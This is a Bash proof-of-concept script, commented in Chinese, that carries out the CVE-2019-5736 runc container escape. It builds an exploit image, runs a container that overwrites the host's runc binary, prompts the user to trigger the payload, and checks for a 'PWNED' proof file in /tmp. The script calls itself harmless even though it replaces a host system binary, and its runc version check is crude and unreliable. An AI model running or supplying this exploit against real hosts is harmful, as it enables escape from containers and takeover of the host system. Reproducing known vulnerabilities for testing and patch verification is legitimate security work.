#!/bin/bash
set -e

echo "[*] CVE-2019-5736 安全复现脚本"
echo "[*] 本 PoC 仅在 /tmp 下创建标记文件，无害且可清理"

# 检查是否为 root 或有 docker 权限
if ! docker info >/dev/null 2>&1; then
    echo "[-] 请确保当前用户有权限运行 docker 命令"
    exit 1
fi

# 检查 runc 版本（可选提示）
RUNC_VERSION=$(runc --version | head -n1 | awk '{print $NF}')
echo "[+] 当前 runc 版本: $RUNC_VERSION"
if [[ "$RUNC_VERSION" > "1.0-rc6" ]] || [[ "$RUNC_VERSION" == "1.0.0"* ]]; then
    echo "[!] 警告：你的 runc 可能已修复 CVE-2019-5736（修复版本 ≥ 1.0-rc6）"
    echo "    但某些旧版 Docker（如 18.09）仍可能受影响，请继续尝试。"
fi

# 清理旧镜像/容器（如有）
docker rm -f cve_2019_5736_poc 2>/dev/null || true
docker rmi cve-2019-5736-poc:latest 2>/dev/null || true

echo "[*] 构建 PoC 镜像..."
docker build -t cve-2019-5736-poc .

echo "[*] 启动 exploit 容器（它将覆盖宿主机的 runc）..."
# 注意：容器需以普通方式启动（无需特权），exploit 会等待 /proc/self/exe 可写
docker run -d --name cve_2019_5736_poc cve-2019-5736-poc

echo "[*] 等待 exploit 覆盖 runc（约 2 秒）..."
sleep 2

# 检查容器日志确认是否成功覆盖
if docker logs cve_2019_5736_poc 2>&1 | grep -q "Successfully overwritten runc binary"; then
    echo "[+] 成功覆盖宿主机 runc！"
else
    echo "[-] 覆盖失败。可能原因："
    echo "    - runc 已修复（只读内存等缓解措施）"
    echo "    - 使用了 containerd 直接调用（非 Docker）"
    echo "    - 内核防护（如 SELinux/AppArmor）"
    docker logs cve_2019_5736_poc
    exit 1
fi

echo ""
echo "[!!!] 现在，请在宿主机手动执行一条 harmless 的 docker run 命令来触发 payload！"
echo "      例如："
echo "        docker run --rm hello-world"
echo ""
read -p "执行完毕后按回车继续验证... " _

# 验证是否生成 proof 文件
PROOF_FILE="/tmp/CVE-2019-5736-PWNED"
if [ -f "$PROOF_FILE" ]; then
    echo ""
    echo "[+] SUCCESS! 宿主机已被 PWNED！"
    echo "    Proof file created: $PROOF_FILE"
    cat "$PROOF_FILE"
else
    echo ""
    echo "[-] 未检测到 proof 文件。"
    echo "    可能原因："
    echo "      - 触发命令未使用被覆盖的 runc（如用了 ctr 而非 docker）"
    echo "      - runc 已被系统保护（如 immutable 属性）"
    echo "      - 使用了较新内核/Docker（含缓解措施）"
fi

echo ""
echo "[*] 提示：为安全起见，请重启 Docker 服务以恢复原始 runc："
echo "      sudo systemctl restart docker"
echo ""
echo "[*] 清理 PoC 容器和镜像..."
docker rm -f cve_2019_5736_poc 2>/dev/null || true
docker rmi cve-2019-5736-poc 2>/dev/null || true

echo "[*] 复现结束。"